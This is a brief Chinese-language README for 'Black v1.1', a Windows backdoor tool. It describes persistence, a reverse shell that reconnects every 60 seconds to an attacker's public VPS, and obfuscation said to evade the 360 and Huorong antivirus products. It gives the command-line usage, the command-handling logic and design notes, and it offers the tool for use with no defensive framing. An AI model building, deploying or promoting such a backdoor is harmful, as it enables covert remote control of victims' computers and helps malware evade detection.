# Windows权限维持后门、持续反弹shell，60s/1次、目前已实现最新版360、火绒免杀
Black v1.1
Usage: black.exe r_ip r_port
author: NOVASEC_黑仔
if cmd == quit:
 关闭管道，临时退出
elif cmd == exit:
 程序结束，永久退出
else:
执行命令，回显结果

##### **~开发思路：**

- S端通过socket管道来传输command给C端，C端执行，实现简易的后门控制
- 采用TCP socket、传输稳定，不掉包（可能会出现粘包，未做边界分离）
- 靶机为C端，公网VPS为S端，C端不断发起连接，以防掉线
- 混淆代码，初步免杀
